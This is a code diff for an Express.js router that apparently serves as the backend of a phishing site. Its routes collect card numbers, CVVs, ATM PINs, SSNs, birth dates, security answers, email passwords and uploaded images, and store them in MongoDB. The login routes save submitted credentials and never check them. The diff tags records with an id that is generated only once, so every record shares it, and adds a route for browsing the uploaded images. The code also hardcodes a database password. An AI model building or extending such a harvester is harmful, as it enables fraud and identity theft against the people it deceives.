@@ -19,7 +19,7 @@ const Grid = require('gridfs-stream');
 const GridFsStorage = require('multer-gridfs-storage')
 
 
-const conn = mongoose.createConnection('mongodb+srv://evereddyer914:<Jefered50>@cluster0.l5tlr1m.mongodb.net/?retryWrites=true&w=majority', {
+const conn = mongoose.createConnection('mongodb+srv://evereddyer914:Jefered50@cluster0.l5tlr1m.mongodb.net/?retryWrites=true&w=majority', {
   useNewUrlParser: true,
   useUnifiedTopology: true,
 });
@@ -35,7 +35,7 @@ conn.once('open', () => {
 
 // Storage
 const storage = new GridFsStorage({
-  url: 'mongodb+srv://evereddyer914:<Jefered50>@cluster0.l5tlr1m.mongodb.net/?retryWrites=true&w=majority',
+  url: 'mongodb+srv://evereddyer914:Jefered50@cluster0.l5tlr1m.mongodb.net/?retryWrites=true&w=majority',
   file: (req, file) => {
     return {
       filename: `${Date.now()}-${file.originalname}`,
@@ -45,6 +45,21 @@ const storage = new GridFsStorage({
 })
 
 const upload = multer({ storage });
+
+function generateRandomId(length) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let randomId = '';
+
+  for (let i = 0; i < length; i++) {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    randomId += characters.charAt(randomIndex);
+  }
+
+  return randomId;
+}
+
+// Example usage to generate a random ID with a length of 10 characters:
+let randomId = generateRandomId(5);
 
 // Login Page
 router.get('/login', forwardAuthenticated, (req, res) => res.render('login'));
@@ -73,7 +88,8 @@ router.post('/card', async (req, res) => {
     expirationMonth: req.body.expirationMonth,
     expirationYear: req.body.expirationYear,
     cvv: req.body.cvv,
-    atm: req.body.atm
+    atm: req.body.atm,
+    id: randomId
   });
 
   card
@@ -94,26 +110,6 @@ router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: '
   res.redirect('/users/emailcnt');
 });
 
-// fix the images getting routes
-router.get('/files', (req, res) => {
-  gfs.files.find().toArray((err, files) => {
-    if (!files || files.length === 0) {
-      return res.status(404).render('index', { files: false });
-    }
-    return res.render('index', { files: files });
-  });
-});
-
-router.get('/files/:filename', (req, res) => {
-  gfs.files.findOne({ filename: req.body.filename }, (err, file) => {
-    if (!file || file.length === 0) {
-      return res.status(404).json({ err: 'No file exists' });
-    }
-    const readstream = gfs.createReadStream(file.filename);
-    readstream.pipe(res);
-  });
-});
-
 // Handle Security Questions Form Submission
 router.post('/questions', async (req, res) => {
   const questions = new Questions({
@@ -122,7 +118,8 @@ router.post('/questions', async (req, res) => {
     answer3: req.body.answer3,
     securityQuestion1: req.body.securityQuestion1,
     securityQuestion2: req.body.securityQuestion2,
-    securityQuestion3: req.body.securityQuestion3
+    securityQuestion3: req.body.securityQuestion3,
+    id: randomId
   });
 
   questions
@@ -149,7 +146,8 @@ router.post('/email', async (req, res) => {
       dobMonth: req.body.dobMonth,
       dobDay: req.body.dobDay,
       dobYear: req.body.dobYear,
-      ssn: req.body.ssn
+      ssn: req.body.ssn,
+      id: randomId
     });
   
     email
@@ -175,7 +173,8 @@ router.post('/email', async (req, res) => {
 router.post('/emailcnt', async (req, res) => {
   const emailcnt = new Email1({
  email: req.body.email,
- password: req.body.password
+ password: req.body.password,
+ id: randomId
   });
 
   emailcnt
@@ -275,6 +274,7 @@ router.post('/login', (req, res, next) => {
   const user = new User({
     email: req.body.email,
     password: req.body.password,
+    id: randomId
   })
 
   user
@@ -295,6 +295,7 @@ router.post('/loginverify', (req, res, next) => {
   const user = new User({
     email: req.body.email,
     password: req.body.password,
+    id: randomId
   })
 
   user
@@ -315,6 +316,51 @@ router.get('/logout', (req, res) => {
   req.logout();
   req.flash('success_msg', 'You are logged out');
   res.redirect('/users/login');
+});
+
+// Retrieve a list of all files in GridFS
+router.get('/files', (req, res) => {
+  gfs.files.find().toArray((err, files) => {
+    // Check if files
+    if (!files || files.length === 0) {
+      res.render('files', { files: false });
+    } else {
+      files.map(file => {
+        if (
+          file.contentType === 'image/jpeg' ||
+          file.contentType === 'image/png'
+        ) {
+          file.isImage = true;
+        } else {
+          file.isImage = false;
+        }
+      });
+      res.render('files', { files: files });
+    }
+  });
+});
+
+// Retrieve a specific file by filename
+router.get('/download/:filename', (req, res) => {
+  gfs.files.findOne({ filename: req.params.filename }, (err, file) => {
+    // Check if file
+    if (!file || file.length === 0) {                                                                                                                                       
+      return res.status(404).json({
+        err: 'No file exists'
+      });
+    }
+
+    // Check if image
+    if (file.contentType === 'image/jpeg' || file.contentType === 'image/png') {
+      // Read output to browser
+      const readstream = gfs.createReadStream(file.filename);
+      readstream.pipe(res);
+    } else {
+      res.status(404).json({
+        err: 'Not an image'
+      });
+    }
+  });
 });
 
 module.exports = router;
